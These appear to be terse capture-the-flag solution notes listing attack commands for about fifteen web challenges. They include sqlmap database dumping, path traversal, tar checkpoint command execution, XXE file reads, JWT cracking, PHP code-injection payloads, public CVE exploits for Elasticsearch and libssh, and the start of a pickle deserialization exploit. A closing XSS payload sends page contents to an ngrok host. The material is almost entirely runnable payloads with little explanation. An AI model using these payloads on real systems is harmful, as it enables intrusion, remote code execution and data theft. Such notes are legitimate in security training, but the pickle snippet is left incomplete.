small data leak:
ip/user?id=
sqlmap -u http://35.246.158.241:31089/user?id=1 --dbs
sqlmap -u http://35.246.158.241:31089/user?id=1 --dbs
sqlmap -u http://35.246.158.241:31089/user?id=1 -D db --tables
sqlmap -u http://35.246.158.241:31089/user?id=1 -D db -T tb --columns

file crawler:
ip/local?image_name=..//..//..//etc/passwd
ip/local?image_name=..////tmp/flag

tartarsausage:
cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec="ls -l"

cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec="cat path/flag"

syntax-check:
<?xml version="1.0" encoding="ISO-8859-1"?>
	<!DOCTYPE foo [
	<!ELEMENT foo ANY>
	<!ENTITY xxe SYSTEM
	"file:///var/www/html/flag">
	]>
	<foo>
		&xxe;
	</foo>                           -this as the first try(wrong encoding)

<?xml version="1.0" encoding="ISO-8859-1"?>
	<!DOCTYPE foo [
	<!ELEMENT foo ANY>
	<!ENTITY xxe SYSTEM
	"php://filter/convert.base64-encode/resource=/var/www/html/flag">
	]>
	<foo>
		&xxe;
	</foo>                          -correct encoding

under construction:
python3 jwt_tool.py -t http://35.198.135.192:32749/admin -rc "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NCwiaWF0IjoxNjk0OTQ0ODIzLCJleHAiOjE2OTUwMzEyMjN9.EGNFWcsnowg-VdCECTgdMznMUbf7k9kR7NI40qg-JU8" -C -d '/home/kali/Desktop/rockyou.txt' 

manual-review:
<script>window.location.href='link/flag';</script>

alien-inclusion:
curl 'http://35.246.134.224:30604/?start=' --data 'start=flag.php'

small-data-leak:
sqlmap -u http://35.246.158.241:31089:???? --dbs

downloader-v1:
link/test.php --post-file '/var/www/html/flag.php'

substitute:
http://34.107.123.245:31050/index.php?vector=/Admin/e&replace=system('ls -l')
http://34.107.123.245:31050/index.php?vector=/Admin/e&replace=system('cat path/flag')

ultra crawl:
file:///etc/passwd
host changed to - company.tld
file:///home/ctf/app.py

elastic:
sudo apt install exploitdb
sudo apt install libxml2-utils
Search for remote oracle exploits for windows:
searchsploit elasticsearch
https://github.com/nixawk/labs/blob/master/CVE-2015-5531/exploit.py
The vulnerability present in the current scenario, offers more details about CVE-2015-5531 Arbitrary file Vulnerability
python exploit_elastic.py link /etc/passwd

libssh:
nmap -sV -sC -p 31367 34.141.12.127 -Pn
You can use CVE-2018-10993 libSSH authentication bypass exploit- https://gist.github.com/mgeeky/a7271536b1d815acfb8060fd8b65bd5d
python3 libssh.py 34.141.12.127 -p 31367 -c "cd ..;cat flag.txt"

php-unit:
$./dirsearch.py -u http://34.141.12.127:32017 -w ./db/dicc.txt
Dirsearch is an advanced command-line tool designed to brute force directories and files in webservers, AKA web path scanner dirsearch is being actively developed by @maurosoria and @shelld3v
./dirsearch.py -u link -w ./db/dicc.txt
composer.json -Here we can find version of php-unit
/eval-stding.php-Vulnerable path
<?php system('cat /flag.txt')?>

sweet and sour:
curl -I link
echo -n "token" | base64 -d
 code:
import pickle
import base64
import requests
class Exploit(object):
      def __reduce__(self):


frameble:
<script>
var exfil = document.getElementsByTagName("body")[0].innerHTML;
window.location.href="https://c3d9707d386e.ngrok.io?pgsrc=" + btoa(exfil);
</script>
then decode base64
